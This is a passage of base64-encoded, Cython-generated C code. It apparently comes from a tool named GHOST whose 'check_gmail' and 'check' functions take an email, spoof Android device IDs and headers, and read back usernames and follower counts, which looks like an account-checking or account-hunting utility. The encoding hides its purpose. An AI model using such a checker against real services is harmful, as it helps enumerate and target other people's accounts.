eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vcmlnaW5hbF9lbWFpbCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X28pO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGwpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcGFyYW1zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcm5hbWUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm9sbG93ZXJfY291bnQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3Zfb2spO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZ2cpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xNWNoZWNrKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0dF81R0hPU1RfMTVjaGVjayA9IHsiY2hlY2siLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF81R0hPU1RfMTVjaGVjaywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xNWNoZWNrKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVjayAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMTc0LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMTc0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDE3NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImNoZWNrIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNzQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCAxNzQsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMTc0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDE3NCwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTtcbiAgICBfX3B5eF92X2VtYWlsID0gdmFsdWVzWzFdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2siLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAxNzQsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuY2hlY2siLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzE0Y2hlY2soX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X2VtYWlsKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8xNGNoZWNrKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGV2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGV2aWNlX2lkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdXVpID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSBOVUxMO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzc7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTMgPSBOVUxMO1xuICBpbnQgX19weXhfdF8xNDtcbiAgaW50IF9fcHl4X3RfMTU7XG4gIGludCBfX3B5eF90XzE2O1xuICBjaGFyIGNvbnN0ICpfX3B5eF90XzE3O1xuICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjMgPSBOVUxMO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVjayIsIDApO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2diKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF83ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkge1xuICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3VhID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkKTtcbiAgICAgIF9fcHl4X3ZfZGV2ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOCA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxNzksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF8xMSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZDQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBfX3B5eF90XzcgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTMpKSkge1xuICAgICAgICBfX3B5eF90XzExID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMyk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzExKTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEzKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEzLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTtcbiAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzEzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgxLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgX19weXhfdF85ID0gUHlVbmljb2RlX0FzRW5jb2RlZFN0cmluZygoKFB5T2JqZWN0KilfX3B5eF90XzEzKSwgTlVMTCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE3OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICBfX3B5eF90XzcgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTApKSkge1xuICAgICAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfOCk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEwLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzcgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfOX07XG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzYgPSBfX3B5eF90XzU7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZXhkaWdlc3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDEtX19weXhfdF83KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNzksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKF9fcHl4X3RfNCwgMCwgMTYsIE5VTEwsIE5VTEwsICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRV